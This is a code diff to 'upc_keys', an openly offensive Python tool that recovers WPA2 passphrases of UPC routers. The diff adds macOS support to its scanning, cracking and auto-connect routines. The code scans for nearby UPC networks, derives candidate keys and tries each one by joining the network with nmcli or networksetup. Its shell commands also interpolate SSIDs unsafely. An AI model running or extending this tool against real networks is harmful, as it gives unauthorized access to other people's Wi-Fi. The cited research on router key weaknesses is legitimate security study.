@@ -3,7 +3,7 @@
 """
 upc_keys // WPA2 passphrase recovery tool for UPC%%07d devices
 Based on: https://haxx.in/upc_keys.c
-Working with Python 2.x, tested on Ubuntu 14.04 / Debian 8.0
+Working with Python 2.x, tested on Ubuntu 14.04 / Debian 8.0 / OS X 10.11
 Author: dsc <sander@cedsys.nl>
 Exploit: blasty <blasty@haxx.in>
 Date: 1-1-2016 (Happy newyear :^)
@@ -16,7 +16,7 @@ against SSIDs of UPC access points.
 # see: [1] http://archive.hack.lu/2015/hacklu15_enovella_reversing_routers.pdf
 #      [2] https://www.usenix.org/system/files/conference/woot15/woot15-paper-lorente.pdf
 
-import sys, argparse, os
+import sys, argparse, os, re
 from upc_keys import crack
 from time import sleep
 from colors import *
@@ -42,16 +42,28 @@ Python by dsc <sander@cedsys.nl>\n"""
         parser.add_argument('-s', '--ssid', type=str, nargs='?', help='The SSID of the vulnerable UPC access point')
         args = vars(parser.parse_args())
 
-        if args['interface']:
+        if sys.platform.startswith('linux'):
+            self.linux = True
+        elif sys.platform == 'darwin':
+            self.linux = False
+        else:
+            exit('uN$Upp0rt3d 0$')
+
+        if args['ssid']:
+            if not self.linux:
+                if not args['interface']:
+                    exit('u h4V3 t0 prOvld3 an 1nt3RF4c3')
+                self.iface = args['interface']
+            results = self.start_crack(args['ssid'])
+            self.finalize([results])
+        elif args['interface']:
             self.iface = args['interface']
             results = self.start_scan()
-        elif args['ssid']:
-            results = self.start_crack(args['ssid'])
+            self.finalize(results)
         else:
             parser.print_help()
             sys.exit()
 
-        self.finalize(results)
 
     def start_scan(self):
         msg("sc4nn1ng teh fr3qu3nc1ez using %s" % self.iface)
@@ -97,17 +109,18 @@ Python by dsc <sander@cedsys.nl>\n"""
         return keys
 
     def nm_scan(self):
-        if not os.popen("cat /sys/class/net/%s/operstate 2> /dev/null" % self.iface).read().lower():
-            exit("No interface %s." % self.iface)
-        elif len(os.popen("whereis nmcli 2> /dev/null").read()) <= 10:
-            exit("Package \"network-manager\" not found.")
 
         aps = []
 
         try:
-            aps = os.popen("nmcli d wifi | awk \'{ print $1; }\' 2> /dev/null").read().split('\n')
-            aps = [z.replace('\"', "").replace("\'", "").strip() for z in aps]
-            aps = [z for z in aps if z.startswith('UPC')]
+            if (self.linux):
+                aps = os.popen("nmcli d wifi | awk \'{ print $1; }\' 2> /dev/null").read().split('\n')
+                aps = [z.replace('\"', "").replace("\'", "").strip() for z in aps]
+            else:
+                aps = os.popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport scan | awk \'{ print $1; }\' 2> /dev/null").read().split('\n')
+                aps = [z.strip() for z in aps]
+
+            aps = [z for z in aps if re.search('UPC\d+', z)]
 
             if not aps:
                 exit("CoulD not sCAn (got r00t?) or DiD not finD Any SSiD's sTArting w1th \'UPC\'.")
@@ -131,10 +144,17 @@ Python by dsc <sander@cedsys.nl>\n"""
                 green, endc, yellow, key['pass'], endc, blue, ssid, endc)
 
             # popen Lik3 itZ 1999
-            resp = os.popen("nmcli -w 4 dev wifi con \"%s\" password \"%s\" name \"ced\" 2> /dev/null" % (ssid, key['pass'])).read()
-            dhcp = os.popen("/sbin/ifconfig %s | grep \"inet addr:\" | cut -d: -f2 | awk \"{ print $1}\"" % self.iface).read()
+            if (self.linux):
+                resp = os.popen("nmcli -w 4 dev wifi con \"%s\" password \"%s\" name \"ced\" 2> /dev/null" % (ssid, key['pass'])).read()
+                dhcp = os.popen("/sbin/ifconfig %s | grep \"inet addr:\" | cut -d: -f2 | awk \"{ print $1}\"" % self.iface).read()
+            else:
+                resp = os.popen("networksetup -setairportnetwork %s \"%s\" \"%s\"" % (self.iface, ssid, key['pass'])).read()
+                if not resp:
+                    sleep(15)
+                    dhcp = os.popen("/sbin/ifconfig %s | grep \"inet \" | cut -d \" \" -f2" % self.iface).read()
 
-            if resp.lower().startswith('error') or not dhcp:
+            if ((self.linux and resp.lower().startswith('error')) or
+                    (not self.linux and resp) or not dhcp):
                 sys.stdout.write("%s ^ nope%s\n" % (red, endc))
 
                 self.nm_hak_cleanup(ssid)
@@ -150,8 +170,12 @@ Python by dsc <sander@cedsys.nl>\n"""
         sys.stdout.write('\n')
 
     def nm_hak_cleanup(self, ssid):
-        os.popen("nmcli con delete id \"ced\"")
-        os.popen("nmcli con down \"%s\"" % ssid).read()
+        if self.linux:
+            os.popen("nmcli con delete id \"ced\"")
+            os.popen("nmcli con down \"%s\"" % ssid).read()
+        else:
+            os.popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z")
+            os.popen("networksetup -removepreferredwirelessnetwork %s %s" % (self.iface, ssid))
         sleep(1.5)
 
     def yo_dawg(self):
